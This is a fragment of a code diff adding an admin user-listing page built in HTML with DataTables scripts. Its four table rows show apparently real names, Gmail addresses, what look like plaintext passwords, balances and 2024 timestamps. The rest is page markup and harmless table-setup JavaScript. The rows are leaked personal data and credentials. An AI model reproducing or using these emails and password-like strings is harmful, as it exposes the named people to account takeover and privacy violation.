+						<form action="users.php" method="post">
+<td>Huchen901</td>
+							<td id="email">annwaruguru513@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="annwaruguru513@gmail.com"> </td>
+							
+							<td>t2TTCX87dj</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-03-05 15:09:26</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Mthobisi phelelani macu</td>
+							<td id="email">macumthobisi488@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="macumthobisi488@gmail.com"> </td>
+							
+							<td>u4ZT7HQeJS</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-03-05 07:00:09</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>TESTING ACCOUNT</td>
+							<td id="email">tyleraziz407@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="tyleraziz407@gmail.com"> </td>
+							
+							<td>C8UVluM3w4</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>733</td>
+              
+              <td>2024-02-29 16:15:03</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Tonnie</td>
+							<td id="email">tonniedash@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="tonniedash@gmail.com"> </td>
+							
+							<td>4AycBNsCSB</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-02-29 13:08:59</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  					</tbody>
+
+
+
+				</table>
+				
+</div>
+          </div>
+
+		  </div>
+          <!-- /top tiles -->
+
+          </div>
+
+        
+
+
+    </body>
+              </div>
+            </div>
+
+
+              </div>
+
+
+          <br />
+
+
+
+
+
+
+
+    </body>
+              </div>
+            </div>
+
+
+
+
+          </section>
+
+   </div>
+  </div>
+</div>
+
+
+  </body>
+</html>
+
+
+
+
+     
+<script>
+$(document).ready(function() {
+    var table = $('#example').DataTable( {
+        lengthChange: false,
+        buttons: [ 'copy', 'excel', 'pdf', 'colvis' ],
+       
+    } );
+    
+
+    table.buttons().container()
+        .insertBefore( '#example_filter' );
+
+        table.buttons().container()
+        .appendTo( '#example_wrapper .col-sm-12:eq(0)' );
+} );
+</script>
+
+
+
+
+
+
+<script>
+$(document).ready(function () {
+        $('#table')
+                .dataTable({
+                    "responsive": true,
+                    
+                });
+
+				
+    });
+
+
+
+				</script>
+                                                                        
